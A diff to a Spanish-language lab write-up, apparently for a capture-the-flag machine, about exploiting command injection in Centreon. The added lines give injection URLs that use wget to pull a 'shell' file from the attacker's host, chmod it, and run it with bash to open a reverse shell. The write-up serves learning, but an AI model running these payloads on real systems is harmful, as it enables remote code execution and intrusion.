@@ -76,5 +76,15 @@ De primeras, crearé un archivo llamado 'shell' con una reverse dentro, comparti
 
 ![image](https://user-images.githubusercontent.com/87484792/184157502-36293fb2-ee1a-4d9f-9c34-5a1b7279e2c5.png)
 
-`http://10.10.10.157/centreon/main.get.php?p=60801&command_hostaddress=&command_example=&command_line=wget%20http%3A%2F%2F10.10.16.7%2Fshell%20%3E%20%2Ftmp%2Fshell&o=p&min=1`
+`http://10.10.10.157/centreon/main.get.php?p=60801&command_hostaddress=&command_example=&command_line=wget%20http%3A%2F%2F10.10.16.7%2Fshell%20-O%20%2Ftmp%2Fshell&o=p&min=1`
+
+Despues de este paso, queda activarlo para obtener la shell. Ejecutaremos bash.
+Para eso antes, me pondré en escucha por el puerto 8081. Y finalmente, ejecutamos.
+
+`http://10.10.10.157/centreon/main.get.php?p=60801&command_hostaddress=&command_example=&command_line=chmod%20777%20/tmp/shell&o=p&min=1`
+
+`http://10.10.10.157/centreon/main.get.php?p=60801&command_hostaddress=&command_example=&command_line=bash%20%2Ftmp%2Fshell&o=p&min=1`
+
+![image](https://user-images.githubusercontent.com/87484792/184161738-661c37ad-69d8-496f-b830-8d1b8edaacf6.png)
+
 
